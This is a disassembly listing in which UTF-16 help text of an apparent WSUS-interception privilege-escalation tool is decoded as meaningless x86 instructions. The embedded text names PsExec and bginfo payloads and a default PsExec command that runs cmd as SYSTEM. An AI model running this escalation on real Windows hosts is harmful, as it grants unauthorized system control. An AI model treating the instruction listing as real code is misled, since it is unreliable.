  4084ac:	00 53 00             	add    %dl,0x0(%ebx)
  4084af:	20 00                	and    %al,(%eax)
  4084b1:	72 00                	jb     0x4084b3
  4084b3:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  4084b7:	75 00                	jne    0x4084b9
  4084b9:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4084bd:	74 00                	je     0x4084bf
  4084bf:	73 00                	jae    0x4084c1
  4084c1:	20 00                	and    %al,(%eax)
  4084c3:	61                   	popa
  4084c4:	00 6e 00             	add    %ch,0x0(%esi)
  4084c7:	64 00 20             	add    %ah,%fs:(%eax)
  4084ca:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  4084ce:	00 79 00             	add    %bh,0x0(%ecx)
  4084d1:	20 00                	and    %al,(%eax)
  4084d3:	74 00                	je     0x4084d5
  4084d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4084d6:	00 20                	add    %ah,(%eax)
  4084d8:	00 65 00             	add    %ah,0x0(%ebp)
  4084db:	73 00                	jae    0x4084dd
  4084dd:	63 00                	arpl   %eax,(%eax)
  4084df:	61                   	popa
  4084e0:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  4084e4:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4084e8:	00 20                	add    %ah,(%eax)
  4084ea:	00 70 00             	add    %dh,0x0(%eax)
  4084ed:	72 00                	jb     0x4084ef
  4084ef:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  4084f5:	6c                   	insb   (%dx),%es:(%edi)
  4084f6:	00 65 00             	add    %ah,0x0(%ebp)
  4084f9:	67 00 65 00          	add    %ah,0x0(%di)
  4084fd:	73 00                	jae    0x4084ff
  4084ff:	2e 00 0d 00 0a 00 20 	add    %cl,%cs:0x20000a00
  408506:	00 20                	add    %ah,(%eax)
  408508:	00 20                	add    %ah,(%eax)
  40850a:	00 20                	add    %ah,(%eax)
  40850c:	00 20                	add    %ah,(%eax)
  40850e:	00 20                	add    %ah,(%eax)
  408510:	00 20                	add    %ah,(%eax)
  408512:	00 20                	add    %ah,(%eax)
  408514:	00 20                	add    %ah,(%eax)
  408516:	00 20                	add    %ah,(%eax)
  408518:	00 20                	add    %ah,(%eax)
  40851a:	00 20                	add    %ah,(%eax)
  40851c:	00 20                	add    %ah,(%eax)
  40851e:	00 20                	add    %ah,(%eax)
  408520:	00 20                	add    %ah,(%eax)
  408522:	00 20                	add    %ah,(%eax)
  408524:	00 49 00             	add    %cl,0x0(%ecx)
  408527:	66 00 20             	data16 add %ah,(%eax)
  40852a:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  40852e:	00 75 00             	add    %dh,0x0(%ebp)
  408531:	6e                   	outsb  %ds:(%esi),(%dx)
  408532:	00 63 00             	add    %ah,0x0(%ebx)
  408535:	68 00 65 00 64       	push   $0x64006500
  40853a:	00 20                	add    %ah,(%eax)
  40853c:	00 77 00             	add    %dh,0x0(%edi)
  40853f:	69 00 74 00 68 00    	imul   $0x680074,(%eax),%eax
  408545:	6f                   	outsl  %ds:(%esi),(%dx)
  408546:	00 75 00             	add    %dh,0x0(%ebp)
  408549:	74 00                	je     0x40854b
  40854b:	20 00                	and    %al,(%eax)
  40854d:	61                   	popa
  40854e:	00 6e 00             	add    %ch,0x0(%esi)
  408551:	79 00                	jns    0x408553
  408553:	20 00                	and    %al,(%eax)
  408555:	61                   	popa
  408556:	00 72 00             	add    %dh,0x0(%edx)
  408559:	67 00 75 00          	add    %dh,0x0(%di)
  40855d:	6d                   	insl   (%dx),%es:(%edi)
  40855e:	00 65 00             	add    %ah,0x0(%ebp)
  408561:	6e                   	outsb  %ds:(%esi),(%dx)
  408562:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  408566:	00 2c 00             	add    %ch,(%eax,%eax,1)
  408569:	20 00                	and    %al,(%eax)
  40856b:	74 00                	je     0x40856d
  40856d:	68 00 65 00 20       	push   $0x20006500
  408572:	00 73 00             	add    %dh,0x0(%ebx)
  408575:	63 00                	arpl   %eax,(%eax)
  408577:	72 00                	jb     0x408579
  408579:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40857f:	20 00                	and    %al,(%eax)
  408581:	77 00                	ja     0x408583
  408583:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  408589:	20 00                	and    %al,(%eax)
  40858b:	73 00                	jae    0x40858d
  40858d:	69 00 6d 00 70 00    	imul   $0x70006d,(%eax),%eax
  408593:	6c                   	insb   (%dx),%es:(%edi)
  408594:	00 79 00             	add    %bh,0x0(%ecx)
  408597:	20 00                	and    %al,(%eax)
  408599:	63 00                	arpl   %eax,(%eax)
  40859b:	72 00                	jb     0x40859d
  40859d:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4085a1:	74 00                	je     0x4085a3
  4085a3:	65 00 20             	add    %ah,%gs:(%eax)
  4085a6:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  4085aa:	00 65 00             	add    %ah,0x0(%ebp)
  4085ad:	20 00                	and    %al,(%eax)
  4085af:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  4085b3:	6c                   	insb   (%dx),%es:(%edi)
  4085b4:	00 65 00             	add    %ah,0x0(%ebp)
  4085b7:	20 00                	and    %al,(%eax)
  4085b9:	43                   	inc    %ebx
  4085ba:	00 3a                	add    %bh,(%edx)
  4085bc:	00 5c 00 5c          	add    %bl,0x5c(%eax,%eax,1)
  4085c0:	00 77 00             	add    %dh,0x0(%edi)
  4085c3:	73 00                	jae    0x4085c5
  4085c5:	75 00                	jne    0x4085c7
  4085c7:	73 00                	jae    0x4085c9
  4085c9:	70 00                	jo     0x4085cb
  4085cb:	69 00 63 00 69 00    	imul   $0x690063,(%eax),%eax
  4085d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4085d2:	00 75 00             	add    %dh,0x0(%ebp)
  4085d5:	73 00                	jae    0x4085d7
  4085d7:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  4085db:	61                   	popa
  4085dc:	00 73 00             	add    %dh,0x0(%ebx)
  4085df:	2e 00 68 00          	add    %ch,%cs:0x0(%eax)
  4085e3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4085e7:	65 00 0d 00 0a 00 0d 	add    %cl,%gs:0xd000a00
  4085ee:	00 0a                	add    %cl,(%edx)
  4085f0:	00 20                	add    %ah,(%eax)
  4085f2:	00 20                	add    %ah,(%eax)
  4085f4:	00 20                	add    %ah,(%eax)
  4085f6:	00 20                	add    %ah,(%eax)
  4085f8:	00 20                	add    %ah,(%eax)
  4085fa:	00 20                	add    %ah,(%eax)
  4085fc:	00 20                	add    %ah,(%eax)
  4085fe:	00 20                	add    %ah,(%eax)
  408600:	00 20                	add    %ah,(%eax)
  408602:	00 20                	add    %ah,(%eax)
  408604:	00 20                	add    %ah,(%eax)
  408606:	00 20                	add    %ah,(%eax)
  408608:	00 20                	add    %ah,(%eax)
  40860a:	00 20                	add    %ah,(%eax)
  40860c:	00 20                	add    %ah,(%eax)
  40860e:	00 20                	add    %ah,(%eax)
  408610:	00 20                	add    %ah,(%eax)
  408612:	00 20                	add    %ah,(%eax)
  408614:	00 2f                	add    %ch,(%edi)
  408616:	00 65 00             	add    %ah,0x0(%ebp)
  408619:	78 00                	js     0x40861b
  40861b:	65 00 20             	add    %ah,%gs:(%eax)
  40861e:	00 20                	add    %ah,(%eax)
  408620:	00 20                	add    %ah,(%eax)
  408622:	00 20                	add    %ah,(%eax)
  408624:	00 20                	add    %ah,(%eax)
  408626:	00 20                	add    %ah,(%eax)
  408628:	00 20                	add    %ah,(%eax)
  40862a:	00 20                	add    %ah,(%eax)
  40862c:	00 20                	add    %ah,(%eax)
  40862e:	00 20                	add    %ah,(%eax)
  408630:	00 20                	add    %ah,(%eax)
  408632:	00 20                	add    %ah,(%eax)
  408634:	00 20                	add    %ah,(%eax)
  408636:	00 20                	add    %ah,(%eax)
  408638:	00 20                	add    %ah,(%eax)
  40863a:	00 20                	add    %ah,(%eax)
  40863c:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  408640:	00 65 00             	add    %ah,0x0(%ebp)
  408643:	20 00                	and    %al,(%eax)
  408645:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  408649:	6c                   	insb   (%dx),%es:(%edi)
  40864a:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40864e:	00 70 00             	add    %dh,0x0(%eax)
  408651:	61                   	popa
  408652:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  408656:	00 20                	add    %ah,(%eax)
  408658:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40865c:	00 20                	add    %ah,(%eax)
  40865e:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  408662:	00 65 00             	add    %ah,0x0(%ebp)
  408665:	20 00                	and    %al,(%eax)
  408667:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40866b:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40866f:	75 00                	jne    0x408671
  408671:	74 00                	je     0x408673
  408673:	61                   	popa
  408674:	00 62 00             	add    %ah,0x0(%edx)
  408677:	6c                   	insb   (%dx),%es:(%edi)
  408678:	00 65 00             	add    %ah,0x0(%ebp)
  40867b:	20 00                	and    %al,(%eax)
  40867d:	74 00                	je     0x40867f
  40867f:	6f                   	outsl  %ds:(%esi),(%dx)
  408680:	00 20                	add    %ah,(%eax)
  408682:	00 72 00             	add    %dh,0x0(%edx)
  408685:	75 00                	jne    0x408687
  408687:	6e                   	outsb  %ds:(%esi),(%dx)
  408688:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40868e:	00 20                	add    %ah,(%eax)
  408690:	00 20                	add    %ah,(%eax)
  408692:	00 20                	add    %ah,(%eax)
  408694:	00 20                	add    %ah,(%eax)
  408696:	00 20                	add    %ah,(%eax)
  408698:	00 20                	add    %ah,(%eax)
  40869a:	00 20                	add    %ah,(%eax)
  40869c:	00 20                	add    %ah,(%eax)
  40869e:	00 20                	add    %ah,(%eax)
  4086a0:	00 20                	add    %ah,(%eax)
  4086a2:	00 20                	add    %ah,(%eax)
  4086a4:	00 20                	add    %ah,(%eax)
  4086a6:	00 20                	add    %ah,(%eax)
  4086a8:	00 20                	add    %ah,(%eax)
  4086aa:	00 20                	add    %ah,(%eax)
  4086ac:	00 20                	add    %ah,(%eax)
  4086ae:	00 20                	add    %ah,(%eax)
  4086b0:	00 20                	add    %ah,(%eax)
  4086b2:	00 20                	add    %ah,(%eax)
  4086b4:	00 20                	add    %ah,(%eax)
  4086b6:	00 20                	add    %ah,(%eax)
  4086b8:	00 20                	add    %ah,(%eax)
  4086ba:	00 20                	add    %ah,(%eax)
  4086bc:	00 20                	add    %ah,(%eax)
  4086be:	00 20                	add    %ah,(%eax)
  4086c0:	00 20                	add    %ah,(%eax)
  4086c2:	00 20                	add    %ah,(%eax)
  4086c4:	00 20                	add    %ah,(%eax)
  4086c6:	00 20                	add    %ah,(%eax)
  4086c8:	00 20                	add    %ah,(%eax)
  4086ca:	00 20                	add    %ah,(%eax)
  4086cc:	00 20                	add    %ah,(%eax)
  4086ce:	00 20                	add    %ah,(%eax)
  4086d0:	00 20                	add    %ah,(%eax)
  4086d2:	00 20                	add    %ah,(%eax)
  4086d4:	00 20                	add    %ah,(%eax)
  4086d6:	00 20                	add    %ah,(%eax)
  4086d8:	00 4b 00             	add    %cl,0x0(%ebx)
  4086db:	6e                   	outsb  %ds:(%esi),(%dx)
  4086dc:	00 6f 00             	add    %ch,0x0(%edi)
  4086df:	77 00                	ja     0x4086e1
  4086e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4086e2:	00 20                	add    %ah,(%eax)
  4086e4:	00 70 00             	add    %dh,0x0(%eax)
  4086e7:	61                   	popa
  4086e8:	00 79 00             	add    %bh,0x0(%ecx)
  4086eb:	6c                   	insb   (%dx),%es:(%edi)
  4086ec:	00 6f 00             	add    %ch,0x0(%edi)
  4086ef:	61                   	popa
  4086f0:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  4086f4:	00 20                	add    %ah,(%eax)
  4086f6:	00 61 00             	add    %ah,0x0(%ecx)
  4086f9:	72 00                	jb     0x4086fb
  4086fb:	65 00 20             	add    %ah,%gs:(%eax)
  4086fe:	00 62 00             	add    %ah,0x0(%edx)
  408701:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  408705:	6e                   	outsb  %ds:(%esi),(%dx)
  408706:	00 66 00             	add    %ah,0x0(%esi)
  408709:	6f                   	outsl  %ds:(%esi),(%dx)
  40870a:	00 20                	add    %ah,(%eax)
  40870c:	00 61 00             	add    %ah,0x0(%ecx)
  40870f:	6e                   	outsb  %ds:(%esi),(%dx)
  408710:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  408714:	00 50 00             	add    %dl,0x0(%eax)
  408717:	73 00                	jae    0x408719
  408719:	45                   	inc    %ebp
  40871a:	00 78 00             	add    %bh,0x0(%eax)
  40871d:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  408721:	2e 00 20             	add    %ah,%cs:(%eax)
  408724:	00 28                	add    %ch,(%eax)
  408726:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  40872a:	00 66 00             	add    %ah,0x0(%esi)
  40872d:	61                   	popa
  40872e:	00 75 00             	add    %dh,0x0(%ebp)
  408731:	6c                   	insb   (%dx),%es:(%edi)
  408732:	00 74 00 3a          	add    %dh,0x3a(%eax,%eax,1)
  408736:	00 20                	add    %ah,(%eax)
  408738:	00 2e                	add    %ch,(%esi)
  40873a:	00 5c 00 50          	add    %bl,0x50(%eax,%eax,1)
  40873e:	00 73 00             	add    %dh,0x0(%ebx)
  408741:	45                   	inc    %ebp
  408742:	00 78 00             	add    %bh,0x0(%eax)
  408745:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  408749:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40874d:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  408751:	78 00                	js     0x408753
  408753:	65 00 29             	add    %ch,%gs:(%ecx)
  408756:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40875c:	00 20                	add    %ah,(%eax)
  40875e:	00 20                	add    %ah,(%eax)
  408760:	00 20                	add    %ah,(%eax)
  408762:	00 20                	add    %ah,(%eax)
  408764:	00 20                	add    %ah,(%eax)
  408766:	00 20                	add    %ah,(%eax)
  408768:	00 20                	add    %ah,(%eax)
  40876a:	00 20                	add    %ah,(%eax)
  40876c:	00 20                	add    %ah,(%eax)
  40876e:	00 20                	add    %ah,(%eax)
  408770:	00 20                	add    %ah,(%eax)
  408772:	00 20                	add    %ah,(%eax)
  408774:	00 20                	add    %ah,(%eax)
  408776:	00 20                	add    %ah,(%eax)
  408778:	00 20                	add    %ah,(%eax)
  40877a:	00 20                	add    %ah,(%eax)
  40877c:	00 20                	add    %ah,(%eax)
  40877e:	00 2f                	add    %ch,(%edi)
  408780:	00 63 00             	add    %ah,0x0(%ebx)
  408783:	6f                   	outsl  %ds:(%esi),(%dx)
  408784:	00 6d 00             	add    %ch,0x0(%ebp)
  408787:	6d                   	insl   (%dx),%es:(%edi)
  408788:	00 61 00             	add    %ah,0x0(%ecx)
  40878b:	6e                   	outsb  %ds:(%esi),(%dx)
  40878c:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  408790:	00 20                	add    %ah,(%eax)
  408792:	00 20                	add    %ah,(%eax)
  408794:	00 20                	add    %ah,(%eax)
  408796:	00 20                	add    %ah,(%eax)
  408798:	00 20                	add    %ah,(%eax)
  40879a:	00 20                	add    %ah,(%eax)
  40879c:	00 20                	add    %ah,(%eax)
  40879e:	00 20                	add    %ah,(%eax)
  4087a0:	00 20                	add    %ah,(%eax)
  4087a2:	00 20                	add    %ah,(%eax)
  4087a4:	00 20                	add    %ah,(%eax)
  4087a6:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  4087aa:	00 65 00             	add    %ah,0x0(%ebp)
  4087ad:	20 00                	and    %al,(%eax)
  4087af:	63 00                	arpl   %eax,(%eax)
  4087b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4087b2:	00 6d 00             	add    %ch,0x0(%ebp)
  4087b5:	6d                   	insl   (%dx),%es:(%edi)
  4087b6:	00 61 00             	add    %ah,0x0(%ecx)
  4087b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4087ba:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  4087be:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  4087c2:	00 20                	add    %ah,(%eax)
  4087c4:	00 65 00             	add    %ah,0x0(%ebp)
  4087c7:	78 00                	js     0x4087c9
  4087c9:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4087cd:	75 00                	jne    0x4087cf
  4087cf:	74 00                	je     0x4087d1
  4087d1:	65 00 20             	add    %ah,%gs:(%eax)
  4087d4:	00 28                	add    %ch,(%eax)
  4087d6:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  4087da:	00 66 00             	add    %ah,0x0(%esi)
  4087dd:	61                   	popa
  4087de:	00 75 00             	add    %dh,0x0(%ebp)
  4087e1:	6c                   	insb   (%dx),%es:(%edi)
  4087e2:	00 74 00 3a          	add    %dh,0x3a(%eax,%eax,1)
  4087e6:	00 20                	add    %ah,(%eax)
  4087e8:	00 2d 00 61 00 63    	add    %ch,0x63006100
  4087ee:	00 63 00             	add    %ah,0x0(%ebx)
  4087f1:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  4087f5:	74 00                	je     0x4087f7
  4087f7:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  4087fb:	6c                   	insb   (%dx),%es:(%edi)
  4087fc:	00 61 00             	add    %ah,0x0(%ecx)
  4087ff:	20 00                	and    %al,(%eax)
  408801:	2d 00 73 00 20       	sub    $0x20007300,%eax
  408806:	00 2d 00 64 00 20    	add    %ch,0x20006400
  40880c:	00 63 00             	add    %ah,0x0(%ebx)
  40880f:	6d                   	insl   (%dx),%es:(%edi)
  408810:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  408814:	00 2f                	add    %ch,(%edi)
  408816:	00 63 00             	add    %ah,0x0(%ebx)
  408819:	20 00                	and    %al,(%eax)
  40881b:	22 00                	and    (%eax),%al
  40881d:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  408821:	68 00 6f 00 20       	push   $0x20006f00
  408826:	00 31                	add    %dh,(%ecx)
  408828:	00 20                	add    %ah,(%eax)
  40882a:	00 3e                	add    %bh,(%esi)
  40882c:	00 20                	add    %ah,(%eax)
  40882e:	00 43 00             	add    %al,0x0(%ebx)
  408831:	3a 00                	cmp    (%eax),%al
  408833:	5c                   	pop    %esp
  408834:	00 5c 00 77          	add    %bl,0x77(%eax,%eax,1)
  408838:	00 73 00             	add    %dh,0x0(%ebx)
  40883b:	75 00                	jne    0x40883d
  40883d:	73 00                	jae    0x40883f
  40883f:	70 00                	jo     0x408841
  408841:	69 00 63 00 69 00    	imul   $0x690063,(%eax),%eax
  408847:	6f                   	outsl  %ds:(%esi),(%dx)
  408848:	00 75 00             	add    %dh,0x0(%ebp)
  40884b:	73 00                	jae    0x40884d
  40884d:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  408851:	61                   	popa
  408852:	00 73 00             	add    %dh,0x0(%ebx)
  408855:	2e 00 68 00          	add    %ch,%cs:0x0(%eax)
  408859:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40885d:	65 00 22             	add    %ah,%gs:(%edx)
  408860:	00 29                	add    %ch,(%ecx)
  408862:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  408868:	00 20                	add    %ah,(%eax)
  40886a:	00 20                	add    %ah,(%eax)
  40886c:	00 20                	add    %ah,(%eax)
  40886e:	00 20                	add    %ah,(%eax)
  408870:	00 20                	add    %ah,(%eax)
  408872:	00 20                	add    %ah,(%eax)
  408874:	00 20                	add    %ah,(%eax)
  408876:	00 20                	add    %ah,(%eax)
  408878:	00 20                	add    %ah,(%eax)
  40887a:	00 20                	add    %ah,(%eax)
  40887c:	00 20                	add    %ah,(%eax)
  40887e:	00 20                	add    %ah,(%eax)
  408880:	00 20                	add    %ah,(%eax)
  408882:	00 20                	add    %ah,(%eax)
  408884:	00 20                	add    %ah,(%eax)
  408886:	00 20                	add    %ah,(%eax)
  408888:	00 20                	add    %ah,(%eax)
  40888a:	00 2f                	add    %ch,(%edi)
  40888c:	00 70 00             	add    %dh,0x0(%eax)
  40888f:	72 00                	jb     0x408891
  408891:	6f                   	outsl  %ds:(%esi),(%dx)
  408892:	00 78 00             	add    %bh,0x0(%eax)
  408895:	79 00                	jns    0x408897
  408897:	70 00                	jo     0x408899
  408899:	6f                   	outsl  %ds:(%esi),(%dx)
  40889a:	00 72 00             	add    %dh,0x0(%edx)
  40889d:	74 00                	je     0x40889f
  40889f:	20 00                	and    %al,(%eax)
  4088a1:	20 00                	and    %al,(%eax)
  4088a3:	20 00                	and    %al,(%eax)
  4088a5:	20 00                	and    %al,(%eax)
  4088a7:	20 00                	and    %al,(%eax)
  4088a9:	20 00                	and    %al,(%eax)
  4088ab:	20 00                	and    %al,(%eax)
  4088ad:	20 00                	and    %al,(%eax)
  4088af:	20 00                	and    %al,(%eax)
  4088b1:	20 00                	and    %al,(%eax)
  4088b3:	54                   	push   %esp
  4088b4:	00 68 00             	add    %ch,0x0(%eax)
  4088b7:	65 00 20             	add    %ah,%gs:(%eax)
  4088ba:	00 70 00             	add    %dh,0x0(%eax)
  4088bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4088be:	00 72 00             	add    %dh,0x0(%edx)
  4088c1:	74 00                	je     0x4088c3
  4088c3:	20 00                	and    %al,(%eax)
  4088c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4088c6:	00 6e 00             	add    %ch,0x0(%esi)
  4088c9:	20 00                	and    %al,(%eax)
  4088cb:	77 00                	ja     0x4088cd
  4088cd:	68 00 69 00 63       	push   $0x63006900
  4088d2:	00 68 00             	add    %ch,0x0(%eax)
  4088d5:	20 00                	and    %al,(%eax)
  4088d7:	74 00                	je     0x4088d9
  4088d9:	68 00 65 00 20       	push   $0x20006500
  4088de:	00 70 00             	add    %dh,0x0(%eax)
  4088e1:	72 00                	jb     0x4088e3
  4088e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4088e4:	00 78 00             	add    %bh,0x0(%eax)
  4088e7:	79 00                	jns    0x4088e9
  4088e9:	20 00                	and    %al,(%eax)
  4088eb:	69 00 73 00 20 00    	imul   $0x200073,(%eax),%eax
  4088f1:	73 00                	jae    0x4088f3
  4088f3:	74 00                	je     0x4088f5
  4088f5:	61                   	popa
  4088f6:	00 72 00             	add    %dh,0x0(%edx)
  4088f9:	74 00                	je     0x4088fb
  4088fb:	65 00 64 00 2e       	add    %ah,%gs:0x2e(%eax,%eax,1)
  408900:	00 20                	add    %ah,(%eax)
  408902:	00 28                	add    %ch,(%eax)
  408904:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  408908:	00 66 00             	add    %ah,0x0(%esi)
  40890b:	61                   	popa
  40890c:	00 75 00             	add    %dh,0x0(%ebp)
  40890f:	6c                   	insb   (%dx),%es:(%edi)
  408910:	00 74 00 3a          	add    %dh,0x3a(%eax,%eax,1)
  408914:	00 20                	add    %ah,(%eax)
  408916:	00 31                	add    %dh,(%ecx)
  408918:	00 33                	add    %dh,(%ebx)
  40891a:	00 33                	add    %dh,(%ebx)
  40891c:	00 33                	add    %dh,(%ebx)
  40891e:	00 37                	add    %dh,(%edi)
  408920:	00 29                	add    %ch,(%ecx)
  408922:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  408928:	00 20                	add    %ah,(%eax)
  40892a:	00 20                	add    %ah,(%eax)
  40892c:	00 20                	add    %ah,(%eax)
  40892e:	00 20                	add    %ah,(%eax)
  408930:	00 20                	add    %ah,(%eax)
  408932:	00 20                	add    %ah,(%eax)
  408934:	00 20                	add    %ah,(%eax)
  408936:	00 20                	add    %ah,(%eax)
  408938:	00 20                	add    %ah,(%eax)
  40893a:	00 20                	add    %ah,(%eax)
  40893c:	00 20                	add    %ah,(%eax)
  40893e:	00 20                	add    %ah,(%eax)
  408940:	00 20                	add    %ah,(%eax)
  408942:	00 20                	add    %ah,(%eax)
  408944:	00 20                	add    %ah,(%eax)
  408946:	00 20                	add    %ah,(%eax)
  408948:	00 20                	add    %ah,(%eax)
  40894a:	00 2f                	add    %ch,(%edi)
  40894c:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  408950:	00 77 00             	add    %dh,0x0(%edi)
  408953:	6e                   	outsb  %ds:(%esi),(%dx)
  408954:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  408958:	00 61 00             	add    %ah,0x0(%ecx)
  40895b:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  40895f:	6f                   	outsl  %ds:(%esi),(%dx)
  408960:	00 72 00             	add    %dh,0x0(%edx)
  408963:	74 00                	je     0x408965
  408965:	20 00                	and    %al,(%eax)
  408967:	20 00                	and    %al,(%eax)
  408969:	20 00                	and    %al,(%eax)
  40896b:	20 00                	and    %al,(%eax)
  40896d:	20 00                	and    %al,(%eax)
  40896f:	20 00                	and    %al,(%eax)
  408971:	20 00                	and    %al,(%eax)
  408973:	54                   	push   %esp
  408974:	00 68 00             	add    %ch,0x0(%eax)
  408977:	65 00 20             	add    %ah,%gs:(%eax)
  40897a:	00 70 00             	add    %dh,0x0(%eax)
  40897d:	6f                   	outsl  %ds:(%esi),(%dx)
  40897e:	00 72 00             	add    %dh,0x0(%edx)
  408981:	74 00                	je     0x408983
  408983:	20 00                	and    %al,(%eax)
  408985:	6f                   	outsl  %ds:(%esi),(%dx)
  408986:	00 6e 00             	add    %ch,0x0(%esi)
  408989:	20 00                	and    %al,(%eax)
  40898b:	77 00                	ja     0x40898d
  40898d:	68 00 69 00 63       	push   $0x63006900
  408992:	00 68 00             	add    %ch,0x0(%eax)
  408995:	20 00                	and    %al,(%eax)
  408997:	74 00                	je     0x408999
  408999:	68 00 65 00 20       	push   $0x20006500
  40899e:	00 77 00             	add    %dh,0x0(%edi)
  4089a1:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  4089a5:	20 00                	and    %al,(%eax)
  4089a7:	73 00                	jae    0x4089a9
  4089a9:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4089ad:	76 00                	jbe    0x4089af
  4089af:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4089b3:	20 00                	and    %al,(%eax)
  4089b5:	68 00 6f 00 73       	push   $0x73006f00
  4089ba:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4089be:	00 6e 00             	add    %ch,0x0(%esi)
  4089c1:	67 00 20             	add    %ah,(%bx,%si)
  4089c4:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  4089c8:	00 65 00             	add    %ah,0x0(%ebp)
  4089cb:	20 00                	and    %al,(%eax)
  4089cd:	70 00                	jo     0x4089cf
  4089cf:	61                   	popa
  4089d0:	00 79 00             	add    %bh,0x0(%ecx)
  4089d3:	6c                   	insb   (%dx),%es:(%edi)
  4089d4:	00 6f 00             	add    %ch,0x0(%edi)
  4089d7:	61                   	popa
  4089d8:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  4089dc:	00 69 00             	add    %ch,0x0(%ecx)
  4089df:	73 00                	jae    0x4089e1
  4089e1:	20 00                	and    %al,(%eax)
  4089e3:	73 00                	jae    0x4089e5
  4089e5:	74 00                	je     0x4089e7
  4089e7:	61                   	popa
  4089e8:	00 72 00             	add    %dh,0x0(%edx)
  4089eb:	74 00                	je     0x4089ed
  4089ed:	65 00 64 00 2e       	add    %ah,%gs:0x2e(%eax,%eax,1)
  4089f2:	00 20                	add    %ah,(%eax)
  4089f4:	00 28                	add    %ch,(%eax)
  4089f6:	00 53 00             	add    %dl,0x0(%ebx)
  4089f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4089fa:	00 6d 00             	add    %ch,0x0(%ebp)
  4089fd:	65 00 74 00 69       	add    %dh,%gs:0x69(%eax,%eax,1)
  408a02:	00 6d 00             	add    %ch,0x0(%ebp)
  408a05:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  408a09:	20 00                	and    %al,(%eax)
  408a0b:	75 00                	jne    0x408a0d
  408a0d:	73 00                	jae    0x408a0f
  408a0f:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  408a13:	75 00                	jne    0x408a15
  408a15:	6c                   	insb   (%dx),%es:(%edi)
  408a16:	00 20                	add    %ah,(%eax)
  408a18:	00 66 00             	add    %ah,0x0(%esi)
  408a1b:	6f                   	outsl  %ds:(%esi),(%dx)
  408a1c:	00 72 00             	add    %dh,0x0(%edx)
  408a1f:	20 00                	and    %al,(%eax)
  408a21:	6f                   	outsl  %ds:(%esi),(%dx)
  408a22:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
  408a26:	00 65 00             	add    %ah,0x0(%ebp)
  408a29:	72 00                	jb     0x408a2b
  408a2b:	20 00                	and    %al,(%eax)
  408a2d:	57                   	push   %edi
  408a2e:	00 69 00             	add    %ch,0x0(%ecx)
  408a31:	6e                   	outsb  %ds:(%esi),(%dx)
  408a32:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  408a36:	00 77 00             	add    %dh,0x0(%edi)
  408a39:	73 00                	jae    0x408a3b
  408a3b:	20 00                	and    %al,(%eax)
  408a3d:	76 00                	jbe    0x408a3f
  408a3f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408a43:	73 00                	jae    0x408a45
